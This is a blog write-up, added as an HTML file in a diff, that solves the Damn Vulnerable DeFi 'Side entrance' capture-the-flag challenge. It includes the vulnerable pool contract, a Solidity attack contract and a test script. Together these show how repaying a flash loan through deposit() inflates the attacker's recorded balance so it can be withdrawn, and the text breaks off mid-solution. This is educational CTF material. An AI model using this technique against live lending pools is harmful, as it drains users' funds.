@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Damn Vulnerable DeFi - Challenge #4 - Side entrance - della&#39;s blog</title><meta name="Description" content="della&#39;s blog"><meta property="og:title" content="Damn Vulnerable DeFi - Challenge #4 - Side entrance" />
+<meta property="og:description" content="Solution for &ldquo;Damn Vulnerable DeFi - Challenge #4 - Side entrance&rdquo;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dellalibera.github.io/posts/damnvulnerabledefi_04_side-entrance/" /><meta property="og:image" content="https://dellalibera.github.io"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-09-10T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-09-10T00:00:00+00:00" /><meta property="og:site_name" content="della&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://dellalibera.github.io"/>
+
+<meta name="twitter:title" content="Damn Vulnerable DeFi - Challenge #4 - Side entrance"/>
+<meta name="twitter:description" content="Solution for &ldquo;Damn Vulnerable DeFi - Challenge #4 - Side entrance&rdquo;."/>
+<meta name="application-name" content="della&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="della&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dellalibera.github.io/posts/damnvulnerabledefi_04_side-entrance/" /><link rel="prev" href="https://dellalibera.github.io/posts/damnvulnerabledefi_03_truster/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Damn Vulnerable DeFi - Challenge #4 - Side entrance",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/dellalibera.github.io\/posts\/damnvulnerabledefi_04_side-entrance\/"
+        },"genre": "posts","keywords": "Damn Vulnerable DeFi, CTF, Solidity, Blockchain","wordcount":  1238 ,
+        "url": "https:\/\/dellalibera.github.io\/posts\/damnvulnerabledefi_04_side-entrance\/","datePublished": "2022-09-10T00:00:00+00:00","dateModified": "2022-09-10T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "della"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> Home </a><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/advisories/"> Advisories </a><a class="menu-item" href="/about/"> About </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="">Home</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/advisories/" title="">Advisories</a><a class="menu-item" href="/about/" title="">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title">Damn Vulnerable DeFi - Challenge #4 - Side entrance</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://dellalibera.github.io/about/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>della</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="September 10, 2022">September 10, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1238 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-challenge">1) Challenge</a></li>
+    <li><a href="#2-code-review">2) Code Review</a></li>
+    <li><a href="#3-solution">3) Solution</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div id="id-1">Solution for &ldquo;Damn Vulnerable DeFi - Challenge #4 - Side entrance&rdquo;.</div>
+<h2 id="1-challenge">1) Challenge</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.</p>
+<p>This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.</p>
+<p>You must take all ETH from the lending pool. (<a href="https://www.damnvulnerabledefi.xyz/challenges/4.html" target="_blank" rel="noopener noreffer ">link</a>)</p>
+</div>
+        </div>
+    </div>
+<p>Challenge created by <a href="https://twitter.com/tinchoabbate" target="_blank" rel="noopener noreffer ">@tinchoabbate</a>.</p>
+<h2 id="2-code-review">2) Code Review</h2>
+<p>There is only the contract <code>SideEntranceLenderPool</code> (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/side-entrance/SideEntranceLenderPool.sol" target="_blank" rel="noopener noreffer ">source code</a>) that has three functions: <code>deposit</code>, <code>withdraw</code> and <code>flashLoan</code>:</p>
+<ul>
+<li><code>deposit</code> is used to update the balance of the <code>msg.sender</code> with the amount deposited</li>
+<li><code>withdraw</code> is used to send ETH (by calling the <code>sendValue</code> function - doc <a href="https://docs.openzeppelin.com/contracts/2.x/api/utils#Address-sendValue-address-payable-uint256-" target="_blank" rel="noopener noreffer ">here</a>) to the <code>msg.sender</code> with the amount available, taken from the <code>balances</code> variable</li>
+<li><code>flashLoan</code> is used to provide the loan. This function:
+<ul>
+<li>checks if the pool balance is <code>&gt;=</code> than the amount requested (line <code>30</code>)</li>
+<li>calls the <code>execute</code> function of a contract and sends the ETH amount requested (line <code>33</code>)</li>
+<li>finally, it checks if the amount is paid it back (line <code>35</code>)</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">SideEntranceLenderPool</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">using</span> <span style="color:#000">Address</span> <span style="color:#00f">for</span> <span style="color:#00f">address</span> <span style="color:#00f">payable</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">mapping</span> (<span style="color:#00f">address</span> =&gt; <span style="color:#00f">uint256</span>) <span style="color:#00f">private</span> <span style="color:#000">balances</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">deposit</span>() <span style="color:#00f">external</span> <span style="color:#00f">payable</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">balances</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>] += <span style="color:#000">msg</span>.<span style="color:#000">value</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">withdraw</span>() <span style="color:#00f">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">amountToWithdraw</span> = <span style="color:#000">balances</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#000">balances</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>] = <span style="color:#3af">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">payable</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>).<span style="color:#000">sendValue</span>(<span style="color:#000">amountToWithdraw</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">flashLoan</span>(<span style="color:#00f">uint256</span> <span style="color:#000">amount</span>) <span style="color:#00f">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">balanceBefore</span> = <span style="color:#00f">address</span>(<span style="color:#000">this</span>).<span style="color:#000">balance</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">balanceBefore</span> &gt;= <span style="color:#000">amount</span>, <span style="color:#5a2">&#34;Not enough ETH in balance&#34;</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#000">IFlashLoanEtherReceiver</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>).<span style="color:#000">execute</span>{<span style="color:#000">value</span>: <span style="color:#000">amount</span>}();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>).<span style="color:#000">balance</span> &gt;= <span style="color:#000">balanceBefore</span>, <span style="color:#5a2">&#34;Flash loan hasn&#39;t been paid back&#34;</span>);        
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>The <code>balances</code> variable is used to keep track of the balances of different addresses when calling <code>deposit</code> and <code>withdraw</code>.
+Since the amount of token are sent to the <code>execute</code> function, we need to use a contract in order to interact with this function.</p>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>How to request a flash loan?</strong></div>
+        </div>
+    </div>
+<p>Let&rsquo;s build a simple example that uses this function that will request a loan equal to the whole pool balance i.e <code>1000 ETH</code> (challenge <a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/side-entrance/side-entrance.challenge.js#L17" target="_blank" rel="noopener noreffer ">setup</a>).
+What we need to do is:</p>
+<ul>
+<li>define a function in our contract that will call the <code>flashLoan</code> function</li>
+<li>expose a payable function with name <code>execute</code> that will be called by the pool contract</li>
+<li>inside the <code>execute</code> function we can use the loan but we need to pay it back otherwise the condition at line <code>35</code> will fail. Since there are no <code>receive</code> or <code>fallaback</code> function to call in the pool contract, in order to send back the ETH, we need to call the <code>deposit</code> function since it&rsquo;s a payable function.</li>
+</ul>
+<p>To see what happen, let&rsquo;s also keep track the value in the <code>balances</code> variable (you can add a debug log <code>console.log(balances[msg.sender]);</code> in the pool contract before and after the <code>execute</code> function at line <code>33</code> to see these values).</p>
+<p><code>AttackSideEntrance.sol</code>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888;font-style:italic">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span><span style="color:#00f">pragma solidity</span> ^<span style="color:#3af">0</span>.<span style="color:#3af">8</span>.<span style="color:#3af">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">interface</span> <span style="color:#000">ILenderPool</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">deposit</span>() <span style="color:#00f">external</span> <span style="color:#00f">payable</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">flashLoan</span>(<span style="color:#00f">uint256</span> <span style="color:#000">amount</span>) <span style="color:#00f">external</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">withdraw</span>() <span style="color:#00f">external</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"> * @title AttackSideEntrance
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">AttackSideEntrance</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">ILenderPool</span> <span style="color:#000">pool</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">uint256</span> <span style="color:#000">poolBalance</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>(<span style="color:#00f">address</span> <span style="color:#000">_pool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">pool</span> = <span style="color:#000">ILenderPool</span>(<span style="color:#000">_pool</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">poolBalance</span> = <span style="color:#00f">address</span>(<span style="color:#000">pool</span>).<span style="color:#000">balance</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">run</span>() <span style="color:#00f">public</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#000">pool</span>.<span style="color:#000">flashLoan</span>(<span style="color:#000">poolBalance</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">execute</span>() <span style="color:#00f">external</span> <span style="color:#00f">payable</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#888;font-style:italic">// we received 1000 ETH
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>      <span style="color:#000">require</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>).<span style="color:#000">balance</span> == <span style="color:#000">poolBalance</span>, <span style="color:#5a2">&#34;No enough ETH&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#888;font-style:italic">// do something with the loan
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>      <span style="color:#888;font-style:italic">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>      <span style="color:#888;font-style:italic">// pay the loan back to the pool
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>      <span style="color:#000">pool</span>.<span style="color:#000">deposit</span>{<span style="color:#000">value</span>: <span style="color:#000">msg</span>.<span style="color:#000">value</span>}();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div></p>
+<p>We can call the <code>run</code> function with the following code:
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#000">it</span>(<span style="color:#5a2">&#39;Exploit&#39;</span>, <span style="color:#00f">async</span> <span style="color:#00f">function</span> () {
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">/** CODE YOUR EXPLOIT HERE */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">const</span> <span style="color:#000">attack</span> = <span style="color:#00f">await</span>(<span style="color:#00f">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">getContractFactory</span>(<span style="color:#5a2">&#39;AttackSideEntrance&#39;</span>, <span style="color:#000">attacker</span>)).<span style="color:#000">deploy</span>(<span style="color:#00f">this</span>.<span style="color:#000">pool</span>.<span style="color:#000">address</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">attack</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">run</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    });</span></span></code></pre></td></tr></table>
+</div>
+</div></p>
+<p>The function succeded. Cool! Let&rsquo;s see what happened to the <code>balances</code> values.</p>
+<p>Initially, the value for <code>balances[msg.sender]</code>, when the <code>msg.sender</code> is our contract, is of course <code>0</code> since we haven&rsquo;t deposited any amount of ETH.</p>
+<p>After we have paid the loan back, the value for <code>balances[msg.sender]</code> for our contract will be <code>1000</code> ETH.</p>
+<p><strong>Why?</strong> When requesting a loan of <code>1000</code> ETH, this amount is sent from the pool to our contract when calling the <code>execute</code> function (that is a payable function), so the ETH balance of our contract increased by <code>1000</code> ETH.
+When we call the <code>deposit</code> function to pay the loan back, the <code>msg.value</code> will be equal to the amount requested, that is <code>1000</code> ETH. But since the <code>deposit</code> is a payable function, we return the ETH to the pool, so the balance of our contract is decreased by <code>1000</code> ETH. However, the value in the <code>balances</code> variable will be <code>1000</code> ETH for our contract.</p>
+<p>At this point, we were able to change the value in the <code>balances</code> variable.</p>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>What happen when call the withdraw function?</strong></div>
+        </div>
+    </div>
+<p>As we have seen before, the <code>witdraw</code> function does the following:</p>
+<ul>
+<li>get the <code>balances</code> amount for <code>msg.sender</code></li>
+<li>set the <code>balances[msg.sender]</code> to <code>0</code> (preventing reentracy because the value is updated before it is sent)</li>
+<li>sends the initial amount in <code>balances[msg.sender]</code> from the pool to <code>msg.sender</code> by calling <code>sendValue</code></li>
+</ul>
+<p>We have just seen, in our previuos example, that we were able to update the <code>balances</code> value for our contract with <code>1000</code> ETH amount.</p>
+<p>So if we call the withdraw function from our contract, we receive <code>1000</code> ETH, taking all the ETH from the pool. In order to solve the challenge, we need to transfer these ETH from our contract to the attacker address.</p>
+<h2 id="3-solution">3) Solution</h2>
+<p>Here is how the solution works:</p>
+<ol>
+<li>our contact call the <code>flashLoan</code> function with an <code>amount</code> equal to the ETH pool balance (<code>1000</code> ETH)</li>
+<li>the pool will call the <code>execute</code> function sending its entire ETH balance to our contact</li>
